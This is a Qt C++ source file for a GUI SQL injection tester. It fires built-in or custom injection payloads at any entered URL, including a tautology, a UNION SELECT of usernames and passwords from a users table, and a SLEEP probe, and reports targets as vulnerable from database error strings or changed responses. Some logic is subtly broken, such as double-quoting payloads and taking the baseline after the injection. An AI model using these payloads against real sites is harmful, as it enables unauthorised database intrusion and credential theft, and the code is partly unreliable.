#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QFile>
#include <QTextStream>
#include <QDebug>
#include <QMessageBox>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    // Initialize Network Manager
    networkManager = new QNetworkAccessManager(this);

    // ✅ Manually add options to `comboBox_Payload`
    ui->comboBox_Payload->addItem("1' OR '1'='1' --");
    ui->comboBox_Payload->addItem("1' UNION SELECT null, username, password FROM users --");
    ui->comboBox_Payload->addItem("1' AND SLEEP(5) --");
    ui->comboBox_Payload->addItem("[Custom]");  // ✅ Enables custom payload option

    // Initially disable the export log button
    ui->pushButton_ExportLog->setEnabled(false);

    // Connect UI elements to slots (event handlers)
    connect(ui->pushButton_Test, &QPushButton::clicked, this, &MainWindow::testSQLInjection);
    connect(ui->pushButton_ExportLog, &QPushButton::clicked, this, &MainWindow::exportLog);
    connect(ui->comboBox_Payload, &QComboBox::currentIndexChanged, this, &MainWindow::updateCustomPayloadState);
    connect(ui->pushButton_DarkMode, &QPushButton::clicked, this, &MainWindow::toggleDarkMode);
    connect(ui->pushButton_About, &QPushButton::clicked, this, &MainWindow::showAboutDialog);

    // ✅ Ensure the UI is updated correctly at startup
    updateCustomPayloadState(ui->comboBox_Payload->currentIndex());
}

// ✅ Destructor
MainWindow::~MainWindow()
{
    delete ui;
}

// ✅ Show "About" Dialog
void MainWindow::showAboutDialog()
{
    QMessageBox::information(this, "About SQLi Tester",
                             "SQLi Tester v1.0\n\n"
                             "Developed for ethical penetration testing purposes.\n"
                             "Use this tool responsibly and only on systems you have permission to test.\n\n"
                             "Created by: NebulaK12\n"
                             "License: Open Source\n");
}

QString MainWindow::fetchNormalResponse(const QString &url)
{
    QUrl requestUrl(url);
    QNetworkRequest request(requestUrl);  // ✅ Correct QNetworkRequest usage

    // ✅ Use the class-wide `networkManager` instead of creating a local one
    QNetworkReply *reply = networkManager->get(request);

    // Wait for the request to finish
    QEventLoop loop;
    connect(reply, &QNetworkReply::finished, &loop, &QEventLoop::quit);
    loop.exec();

    QString responseText;
    if (reply->error() == QNetworkReply::NoError) {
        responseText = reply->readAll();
    } else {
        qDebug() << "❌ Error fetching normal response:" << reply->errorString();
    }
    reply->deleteLater();
    return responseText;
}

// ✅ SQL Injection Test
void MainWindow::testSQLInjection()
{
    QString url = ui->lineEdit_URL->text();
    if (url.isEmpty()) {
        ui->textEdit_Response->setText("Error: Please enter a target URL.");
        return;
    }

    // Get selected or custom SQL injection payload
    QString payload;
    if (ui->comboBox_Payload->currentText() == "[Custom]") {
        payload = ui->lineEdit_CustomPayload->text().trimmed();
    } else {
        payload = ui->comboBox_Payload->currentText();
    }

    if (payload.isEmpty()) {
        ui->textEdit_Response->setText("Error: SQL Injection payload cannot be empty.");
        return;
    }

    // ✅ Ensure proper formatting of payload
    if (!payload.startsWith("'")) {
        payload = "'" + payload;
    }

    // ✅ Correct URL Formatting
    QString separator = url.contains("?") ? "&" : "?";
    QString fullUrl = url + separator + "cat=" + QUrl::toPercentEncoding(payload);

    // Debugging Output
    qDebug() << "Testing SQL Injection on URL:" << fullUrl;
    qDebug() << "Payload used:" << payload;

    // Create network request
    QUrl requestUrl(fullUrl);
    QNetworkRequest request(requestUrl);

    // Send request
    QNetworkReply *reply = networkManager->get(request);
    connect(reply, &QNetworkReply::finished, this, [=]() {
        if (reply->error() == QNetworkReply::NoError) {
            QString responseText = reply->readAll();
            ui->textEdit_Response->setText(responseText);

            // ✅ Debugging: Print Response
            qDebug() << "Response Text: " << responseText.left(500);

            // ✅ Check for SQL Error Keywords
            QStringList sqlErrors = {
                "You have an error in your SQL syntax",
                "SQL syntax error",
                "MySQL error",
                "Unknown column",
                "Unclosed quotation mark",
                "SQLite error",
                "Incorrect syntax near",
                "Warning: mysql_",
                "Fatal error",
                "ORA-00933",
                "Microsoft OLE DB Provider for SQL Server"
            };

            // ✅ Step 1: Get the normal response BEFORE SQL Injection
            QString normalResponse = fetchNormalResponse(url);

            // ✅ Step 2: Send the SQL Injection request
            bool vulnerable = false;
            QString detectedIssue = "";

            for (const QString &error : sqlErrors) {
                if (responseText.contains(error, Qt::CaseInsensitive)) {
                    vulnerable = true;
                    detectedIssue = error;
                    qDebug() << "🚨 SQL Injection Vulnerability Found: " << error;
                    break;
                }
            }

            // ✅ Step 3: Check if response content has changed (Boolean Injection Detection)
            if (!vulnerable && !normalResponse.isEmpty() && normalResponse != responseText) {
                vulnerable = true;
                detectedIssue = "Response content changed significantly (Possible Boolean-Based SQL Injection)";
                qDebug() << "⚠️ Possible Boolean-Based SQL Injection detected!";
            }

            if (vulnerable) {
                QString errorFound = "🚨 SQL Injection Vulnerability Found! 🚨\n";
                errorFound += "Detected Issue: " + detectedIssue + "\n\n";
                errorFound += "⚠️ Possible Risk: The response changed significantly compared to the normal request.\n";
                errorFound += "👉 This indicates that injecting different values could reveal more data.\n";
                errorFound += "🔎 Try using different SQLi techniques like UNION-based injection.\n\n";
                errorFound += "Full Response:\n" + responseText;

                ui->textEdit_Response->setText(errorFound);
                ui->textEdit_Response->setStyleSheet("color: red; font-weight: bold;");

                qDebug() << "🚨 SQL Injection Detected: " << detectedIssue;
            }

            // ✅ Enable Export Log button
            ui->pushButton_ExportLog->setEnabled(true);

            // ✅ Save log if checkbox is checked
            if (ui->checkBox_SaveLogs->isChecked()) {
                saveLog(fullUrl, responseText, normalResponse);
            }

        } else {
            ui->textEdit_Response->setText("Request Failed: " + reply->errorString());
            qDebug() << "❌ Request Failed: " << reply->errorString();
        }
        reply->deleteLater();
    });
}

// ✅ Save Logs
void MainWindow::saveLog(const QString &request, const QString &response, const QString &normalResponse)
{
    QString filePath = QCoreApplication::applicationDirPath() + "/SQLi_Log.txt";
    QFile file(filePath);

    if (!file.open(QIODevice::Append | QIODevice::Text)) {
        qDebug() << "Error: Cannot open log file: " << file.errorString();
        return;
    }

    QTextStream out(&file);
    QDateTime currentTime = QDateTime::currentDateTime();

    out << "Time: " << currentTime.toString("yyyy-MM-dd HH:mm:ss") << "\n";
    out << "Target URL: " << request << "\n";
    out << "----------------------------------------\n";
    out << "✅ Normal Response:\n" << normalResponse << "\n";
    out << "----------------------------------------\n";
    out << "🚨 Injected Response:\n" << response << "\n";
    out << "----------------------------------------\n\n";

    file.close();
    qDebug() << "Log saved at:" << filePath;
}

// ✅ Export Logs
void MainWindow::exportLog()
{
    QFile file("SQLi_Log.txt");
    if (!file.exists()) {
        ui->textEdit_Response->setText("No logs available to export.");
        return;
    }

    ui->textEdit_Response->setText("Log file saved: SQLi_Log.txt");
}

// ✅ Handle Custom Payload Selection
void MainWindow::updateCustomPayloadState(int index)
{
    if (ui->comboBox_Payload->currentText() == "[Custom]") {
        ui->lineEdit_CustomPayload->setEnabled(true);
        ui->lineEdit_CustomPayload->setPlaceholderText("Enter your SQL Injection payload...");
    } else {
        ui->lineEdit_CustomPayload->setEnabled(false);
        ui->lineEdit_CustomPayload->clear();
    }
}

// ✅ Dark Mode Toggle
void MainWindow::toggleDarkMode()
{
    static bool darkModeEnabled = false;

    if (!darkModeEnabled) {
        qApp->setStyleSheet("QMainWindow { background-color: #121212; color: #E0E0E0; }");
        ui->pushButton_DarkMode->setText("Disable Dark Mode");
    } else {
        qApp->setStyleSheet("");
        ui->pushButton_DarkMode->setText("Enable Dark Mode");
    }

    darkModeEnabled = !darkModeEnabled;
}
